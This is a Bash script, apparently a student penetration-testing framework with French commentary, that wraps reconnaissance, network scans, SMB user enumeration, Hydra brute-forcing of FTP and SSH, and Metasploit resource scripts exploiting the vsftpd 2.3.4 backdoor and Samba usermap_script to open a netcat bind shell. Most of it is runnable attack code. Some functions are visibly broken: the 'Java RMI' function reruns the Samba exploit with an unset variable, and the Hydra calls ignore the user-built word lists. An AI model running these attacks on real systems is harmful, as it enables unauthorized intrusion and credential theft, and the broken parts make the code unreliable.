command_ipaddress() {
    tput clear
    tput cup 0 0
    echo "=================================================="
    echo "    FRAMEWORK - Foot print - IP address    "
    echo "=================================================="
    echo
    echo "IP Address:"
    echo "Executed command: '$ hostname -I'"
    echo "hostname est un outil permetant d'obtenir des information sur un appareil."
    echo "Le '-I' permet d'obtenir l'adresse IP de l'appareil."
    echo
    echo "Command ouput: "
    echo -e "${red}$(hostname -I)${white}"
    echo
    echo "Subnet mask:"
    echo "Executed command: '$ ifconfig'"
    echo "L'outil ifconfig permet d'afficher des informations"
    echo "sur les interfaces réseau actives, de configurer leurs "
    echo "adresses IP, de modifier les paramètres de"
    echo "l'interface, de gérer les interfaces réseaux"
    echo "physiques ou virtuelles, et de résoudre certains"
    echo "problèmes de connexion réseau."
    echo
    echo "Ici nous allons extraire uniquement le subnet mask du réseau:"
    echo -e "${red}$(ifconfig eth0 | grep 'inet ' | cut -d: -f2 | awk '{ print $4}')${white}"
    echo
    read -p "[ENTER]"
}


command_whois() {
    tput clear
    tput cup 0 0
    echo "============================================="
    echo "    FRAMEWORK - Foot print - whois    "
    echo "============================================="
    echo
    echo "whois:"
    read -p "Input domain name: " domainName
    echo "Executed command: '$ whois $domainName'"
    echo
    echo "Command ouput: "
    echo -e "${red}$(whois $domainName)${white}"
    echo
    read -p "[ENTER]"
}

command_hostname() {
    tput clear
    tput cup 0 0
    echo "================================================"
    echo "    FRAMEWORK - Foot print - hostname    "
    echo "================================================"
    echo
    echo "hostname:"
    echo "La commande hostname est utilisée pour afficher" 
    echo "ou définir le nom d'hôte d'un système"
    echo
    echo "Executed command: '$ hostname'"
    echo
    echo "Command ouput: "
    echo -e "${red}$(hostname)${white}"
    echo
    read -p "[ENTER]"
}



command_ping() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Scanning network - ping    "
    echo "================================================"
    echo
    
    # Introduction to the ping command
    echo "ping:"
    echo "La commande ping permet de tester la connectivité entre"
    echo "votre appareil et un autre hôte sur le réseau."
    echo "Elle envoie des requêtes ICMP à l'adresse spécifiée et"
    echo "attend des réponses pour mesurer la latence et vérifier"
    echo "la connectivité réseau."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo "Entrer le nombre de pings à réaliser:"
    read -p ">> " nb_pings
    
    # Display the executed ping command
    echo "Executed command: '$ ping -c $nb_pings $ip_appareil'"
    echo
    
    # Run the ping command and display its output
    echo "Command output: "
    echo -e "${red}$(ping -c $nb_pings $ip_appareil)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}


command_fping() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Scanning network - fping    "
    echo "================================================"
    echo
    
    # Introduction to the fping command
    echo "fping:"
    echo "La commande fping est utilisée sur les systèmes Unix/Linux"
    echo "pour envoyer des requêtes ICMP (ping) à plusieurs hôtes simultanément."
    echo "Elle permet de tester la connectivité réseau de manière plus rapide"
    echo "et efficace qu'avec la commande ping traditionnelle."
    echo "En envoyant des requêtes à plusieurs adresses IP en parallèle,"
    echo "fping réduit le temps nécessaire pour tester un grand nombre d'hôtes."
    echo
    
    # Prompt for IP address input
    echo "Rentrer une adresse ip:"
    read -p ">> " IP_ADDR
    
    # Get the netmask using ifconfig and extract the first result
    NETMASK=$(ifconfig | grep -w 'netmask' | head -n 1 | awk '{print $4}')
    
    # Display the IP and netmask
    echo "Private IP: $IP_ADDR"
    echo "Netmask: $NETMASK"
    
    # Split the IP address and netmask into their individual octets
    IFS=. read -r i1 i2 i3 i4 <<< "$IP_ADDR"
    IFS=. read -r m1 m2 m3 m4 <<< "$NETMASK"
    
    # Calculate the network base and broadcast address
    network_base="$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).$((i4 & m4))"
    broadcast="$((i1 | (255 - m1))).$((i2 | (255 - m2))).$((i3 | (255 - m3))).$((i4 | (255 - m4)))"
    
    # Display the network range
    echo "Network range: $network_base - $broadcast"
    
    # Display the executed command for reference
    echo "Executed command: '$ sudo fping -s -g "$network_base" "$broadcast" --alive -q'"
    echo
    
    # Run the fping command and display its output
    echo "Command output: "
    echo -e "${red}$(sudo fping -s -g "$network_base" "$broadcast" --alive -q)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}

command_nmap() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Scanning network - nmap    "
    echo "================================================"
    echo
    
    # Introduction to the nmap command
    echo "nmap:"
    echo "La commande nmap permet de scanner un réseau pour détecter"
    echo "les hôtes actifs et les ports ouverts sur un appareil."
    echo "L'option '-sS' réalise un scan SYN, qui envoie un paquet SYN"
    echo "et attend une réponse sans établir une connexion complète."
    echo "Cela permet de détecter les ports ouverts tout en étant"
    echo "discret, car il ne termine pas le processus de connexion TCP."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    
    # Display the executed nmap command
    echo "Executed command: '$ sudo nmap -sS $ip_appareil'"
    echo
    
    # Run the nmap command and display its output
    echo "Command output: "
    echo -e "${red}$(sudo nmap -sS $ip_appareil)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}

command_traceroute() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Scanning network - traceroute    "
    echo "================================================"
    echo
    
    # Introduction to the traceroute command
    echo "traceroute:"
    echo "La commande traceroute permet de déterminer le chemin"
    echo "qu'un paquet prend pour atteindre un hôte distant."
    echo "Elle affiche les différents routeurs ou sauts (hops)"
    echo "qu'un paquet traverse entre l'hôte local et la cible."
    echo "Cela permet de diagnostiquer les problèmes de réseau,"
    echo "comme les points de congestion ou les échecs de transmission."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP ou un nom de domaine:"
    read -p ">> " ip_appareil
    echo
    
    # Display the executed traceroute command
    echo "Executed command: '$ traceroute $ip_appareil'"
    echo
    
    # Run the traceroute command and display its output
    echo "Command output: "
    echo -e "${red}$(traceroute $ip_appareil)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}



command_telnet() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Enumeration - telnet    "
    echo "================================================"
    echo
    
    # Introduction to the telnet command
    echo "telnet:"
    echo "La commande telnet permet de se connecter à un appareil"
    echo "sur un réseau en utilisant le protocole Telnet."
    echo "Elle permet de se connecter à un port spécifique sur"
    echo "un hôte distant et d'interagir avec les services"
    echo "qui y sont disponibles. Cette commande est souvent utilisée"
    echo "pour tester les connexions à des services comme des serveurs"
    echo "ou des équipements réseau."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    
    # Prompt for port input
    echo "Entrer un port:"
    read -p ">> " port
    echo
    
    # Display the executed telnet command
    echo "Executing: 'telnet $ip_appareil $port'"
    echo
    
    # Run the telnet command and simulate ESC + ENTER
    echo "Command output: "
    { echo -e "\e"; echo -e "\n"; } | telnet "$ip_appareil" "$port"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}


command_nc() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================"
    echo "    FRAMEWORK - Enumeration - Netcat    "
    echo "================================================"
    echo
    
    # Introduction to the netcat command
    echo "Netcat:"
    echo "La commande netcat (nc) est un outil de réseau puissant,"
    echo "utilisé pour lire ou écrire sur des connexions réseau"
    echo "via le protocole TCP ou UDP. Elle permet de tester"
    echo "la connectivité entre un appareil local et un hôte distant"
    echo "en se connectant à un port spécifique."
    echo "Netcat peut aussi être utilisé pour ouvrir des ports,"
    echo "scanner des hôtes, ou encore pour des transferts de données."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    
    # Prompt for port input
    echo "Entrer un port:"
    read -p ">> " port
    echo
    
    # Display the executed netcat command
    echo "Executing: 'nc $ip_appareil $port'"
    echo
    
    # Run the netcat command and display its output
    echo "Command output: "
    echo -e "${red}$(nc $ip_appareil $port)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}


command_Onmap() {
    # Clear the screen and set the cursor position
    tput clear
    tput cup 0 0
    
    # Display the framework header
    echo "================================================================="
    echo "    FRAMEWORK - Enumeration - Operating system detection nmap    "
    echo "================================================================="
    echo
    
    # Introduction to the nmap OS detection command
    echo "Operating system detection nmap:"
    echo "La commande nmap avec l'option '-O' permet de détecter"
    echo "le système d'exploitation d'un hôte distant en analysant"
    echo "les réponses aux paquets envoyés par nmap. Cette méthode"
    echo "est appelée 'fingerprinting' et utilise des signatures"
    echo "caractéristiques des systèmes d'exploitation."
    echo
    echo "L'option '-oG' génère un rapport de type grepable pour"
    echo "faciliter l'analyse des résultats."
    echo
    
    # Prompt for IP address input
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    
    # Display the executed nmap command
    echo "Executing: 'sudo nmap -O $ip_appareil -oG'"
    echo
    
    # Run the nmap OS detection command and display its output
    echo "Command output: "
    echo -e "${red}$(sudo nmap -O $ip_appareil -oG -)${white}"
    echo
    
    # Wait for user input to continue
    read -p "[ENTER]"
}


command_BSnmap() {
    tput clear
    tput cup 0 0
    echo "================================================================="
    echo "    FRAMEWORK - Enumeration - Banner Grabing avec nmap    "
    echo "================================================================="
    echo
    echo "Operating system detection nmap:"
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    echo "Executing: 'sudo nmap -sV -script=banner $ip_appareil'"
    echo
    echo "Command output: "
    echo -e "${red}$(sudo nmap -sV -script=banner $ip_appareil)${white}"
    echo
    read -p "[ENTER]"
}

command_ennum_nmap() {
    tput clear
    tput cup 0 0
    echo "======================================================================="
    echo "    FRAMEWORK - Enumeration - Enumerating user accounts through Nmap   "
    echo "======================================================================="
    echo
    echo "Enumerating user accounts through Nmap:"
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    echo "Entrer un port:" #généralement 445
    read -p ">> " port
    echo "Executing: 'sudo nmap –script smb-enum-users.nse –p $port $ip_appareil'" #445 est un port par defaut
    echo
    echo "Command output: "
    echo -e "${red}$(sudo nmap --script smb-enum-users.nse -p $port $ip_appareil)${white}"
    echo
    read -p "[ENTER]"
}

command_FTP() {
    # Efface l'écran
    tput clear
    tput cup 0 0
    
    # Affichage de l'en-tête
    echo "======================================================================="
    echo "    FRAMEWORK - Gaining Access - FTP   "
    echo "======================================================================="
    echo
    echo "FTP:"
    
    # Demande la liste des mots de passe
    echo "Entrer une liste de mots de passe (chemin du fichier ou 'nouveau' pour créer) :"
    read -p ">> " password_list
    if [[ "$password_list" == "nouveau" ]]; then
        echo "Entrez les mots de passe, un par ligne. Tapez 'FIN' pour terminer :"
        password_list="mdp.txt"
        > "$password_list" # Vide/crée le fichier
        while true; do
            read -p "> " password
            [[ "$password" == "FIN" ]] && break
            echo "$password" >> "$password_list"
        done
        echo "Fichier de mots de passe créé : $password_list"
    fi

    # Demande la liste des utilisateurs
    echo "Entrer une liste d'utilisateurs (chemin du fichier ou 'nouveau' pour créer) :"
    read -p ">> " user_list
    if [[ "$user_list" == "nouveau" ]]; then
        echo "Entrez les noms d'utilisateur, un par ligne. Tapez 'FIN' pour terminer :"
        user_list="users.txt"
        > "$user_list" # Vide/crée le fichier
        while true; do
            read -p "> " user
            [[ "$user" == "FIN" ]] && break
            echo "$user" >> "$user_list"
        done
        echo "Fichier d'utilisateurs créé : $user_list"
    fi
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    # Exécution de la commande
    echo
    echo "Executing: 'hydra -L /usernames.txt -P /passwords.txt $ip_appareil ftp -V'"
    echo
    echo "Command output: "
    echo -e "${red}$(hydra -L /usernames.txt -P /passwords.txt $ip_appareil ftp -V)${white}"
    # Pause avant de quitter
    echo
    read -p "[ENTRÉE]"
}

command_SSH() {
    # Efface l'écran
    tput clear
    tput cup 0 0
    
    # Affichage de l'en-tête
    echo "======================================================================="
    echo "    FRAMEWORK - Gaining Access - SSH   "
    echo "======================================================================="
    echo
    echo "SSH:"
    
    # Demande la liste des mots de passe
    echo "Entrer une liste de mots de passe (chemin du fichier ou 'nouveau' pour créer) :"
    read -p ">> " password_list
    if [[ "$password_list" == "nouveau" ]]; then
        echo "Entrez les mots de passe, un par ligne. Tapez 'FIN' pour terminer :"
        password_list="mdp.txt"
        > "$password_list" # Vide/crée le fichier
        while true; do
            read -p "> " password
            [[ "$password" == "FIN" ]] && break
            echo "$password" >> "$password_list"
        done
        echo "Fichier de mots de passe créé : $password_list"
    fi

    # Demande la liste des utilisateurs
    echo "Entrer une liste d'utilisateurs (chemin du fichier ou 'nouveau' pour créer) :"
    read -p ">> " user_list
    if [[ "$user_list" == "nouveau" ]]; then
        echo "Entrez les noms d'utilisateur, un par ligne. Tapez 'FIN' pour terminer :"
        user_list="users.txt"
        > "$user_list" # Vide/crée le fichier
        while true; do
            read -p "> " user
            [[ "$user" == "FIN" ]] && break
            echo "$user" >> "$user_list"
        done
        echo "Fichier d'utilisateurs créé : $user_list"
    fi
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    # Exécution de la commande
    echo
    echo "Executing: 'hydra -L usernames.txt -P passwords.txt $ip_appareil ssh -V'"
    echo
    echo "Command output: "
    echo -e "${red}$(hydra -L usernames.txt -P passwords.txt $ip_appareil ssh -V)${white}"
    # Pause avant de quitter
    echo
    read -p "[ENTRÉE]"
}




command_NetCat() {
    tput clear
    tput cup 0 0
    echo "================================================"
    echo "    FRAMEWORK - Gaining Access - Netcat    "
    echo "================================================"
    echo
    echo "Netcat:"
    echo "Entrer une adresse IP:"
    read -p ">> " ip_appareil
    echo
    echo "Entrer un port:"
    read -p ">> " port
    echo
    echo "Executing: 'nc $ip_appareil $port'"
    echo
    echo "Command output: "
    echo -e "${red}$(nc $ip_appareil $port)${white}"
    echo
    read -p "[ENTER]"
}




command_Automatisation() {
    tput clear
    tput cup 0 0
    echo "====================================="
    echo "    FRAMEWORK - Automatisation    "
    echo "====================================="
    echo
    echo "Automatisation:"
    echo "Command output: "
    echo -e "${red}$(bash ./libs/script.sh)${white}"
    echo
    read -p "[ENTER]"
}


function metasploit_vsftpd_exploit() {
    # Demander à l'utilisateur l'adresse IP de la cible
    read -p "Entrez l'adresse IP de la cible (RHOSTS): " TARGET_IP



    # Génération du fichier de commandes pour msfconsole
    MSF_SCRIPT="vsftpd_script.rc"
    cat << EOF > $MSF_SCRIPT
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET_IP
exploit
echo "Ecrivez exit pour sortir de msfconsole"
EOF

    # Exécute msfconsole avec le fichier de commandes généré
    echo "Lancement de msfconsole avec le script..."
    msfconsole -r $MSF_SCRIPT

    # Nettoyage du fichier de script après exécution
    rm -f $MSF_SCRIPT  
}


function attaque_ssh_metasploit() {
    # Efface le terminal et affiche un titre
    tput clear
    echo "================================================"
    echo "         Attaque SSH via Metasploit             "
    echo "================================================"
    echo

    # Demande à l'utilisateur l'adresse IP de la cible
    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
    read -p ">> " TARGET_IP

    # Demande à l'utilisateur le chemin vers le fichier des noms d'utilisateur
    echo "Entrez le chemin vers le fichier des noms d'utilisateur :"
    read -p ">> " USER_FILE

    # Vérifie que le fichier des noms d'utilisateur existe
    if [[ ! -f "$USER_FILE" ]]; then
        echo "Erreur : Le fichier des noms d'utilisateur spécifié n'existe pas."
        return 1
    fi

    # Demande à l'utilisateur le chemin vers le fichier des mots de passe
    echo "Entrez le chemin vers le fichier des mots de passe :"
    read -p ">> " PASS_FILE

    # Vérifie que le fichier des mots de passe existe
    if [[ ! -f "$PASS_FILE" ]]; then
        echo "Erreur : Le fichier des mots de passe spécifié n'existe pas."
        return 1
    fi

    # Génération du fichier de commandes pour Metasploit
    MSF_SCRIPT="attaque_ssh_script.rc"
    cat << EOF > $MSF_SCRIPT
use auxiliary/scanner/ssh/ssh_login
setg RHOSTS $TARGET_IP
set USER_FILE $USER_FILE
set PASS_FILE $PASS_FILE
exploit
echo "Ecrivez exit pour sortir de msfconsole"
EOF

    # Exécute Metasploit avec le fichier de commandes généré
    echo
    echo "Lancement de Metasploit avec le script d'attaque SSH..."
    msfconsole -r $MSF_SCRIPT

    # Nettoie le fichier temporaire après l'exécution
    rm -f $MSF_SCRIPT

}

function samba_usermap_exploit() {
    # Efface le terminal et affiche un titre
    tput clear
    echo "================================================"
    echo "       Exploitation Samba : usermap_script      "
    echo "================================================"
    echo

    # Demande à l'utilisateur l'adresse IP de la cible
    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
    read -p ">> " TARGET_IP

    # Demande à l'utilisateur l'adresse IP de sa propre machine (LHOSTS)
    echo "Entrez l'adresse IP de votre machine (LHOSTS) :"
    read -p ">> " ATTACKER_IP

    # Génération du script Metasploit
    MSF_SCRIPT="samba_usermap_script.rc"
    cat << EOF > $MSF_SCRIPT
use exploit/multi/samba/usermap_script
setg RHOSTS $TARGET_IP
show payloads
set payload cmd/unix/bind_netcat
setg LHOSTS $ATTACKER_IP
set LPORT 4444
exploit
echo "Ecrivez exit pour sortir de msfconsole"
EOF

    # Exécute Metasploit avec le script généré
    echo
    echo "Lancement de Metasploit avec le script d'exploitation Samba..."
    msfconsole -r $MSF_SCRIPT

    # Nettoyage : supprime le fichier temporaire après exécution
    rm -f $MSF_SCRIPT

  
}

    
    function java_rmi_exploit() {
    # Efface le terminal et affiche un titre
    tput clear
    echo "================================================"
    echo "        Exploitation Java RMI Server           "
    echo "================================================"
    echo


    # Demande à l'utilisateur l'adresse IP de la cible
    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
    read -p ">> " TARGET_IP


    # Génération du script Metasploit
    MSF_SCRIPT="samba_usermap_script.rc"
    cat << EOF > $MSF_SCRIPT
use exploit/multi/samba/usermap_script
setg RHOSTS $TARGET_IP
set payload cmd/unix/bind_netcat
setg LHOSTS $ATTACKER_IP
set LPORT 4444
exploit
echo "Ecrivez exit pour sortir de msfconsole"
EOF

    # Exécute Metasploit avec le script généré
    echo
    echo "Lancement de Metasploit avec le script d'exploitation Samba..."
    msfconsole -r $MSF_SCRIPT

    # Nettoyage : supprime le fichier temporaire après exécution
    rm -f $MSF_SCRIPT
}


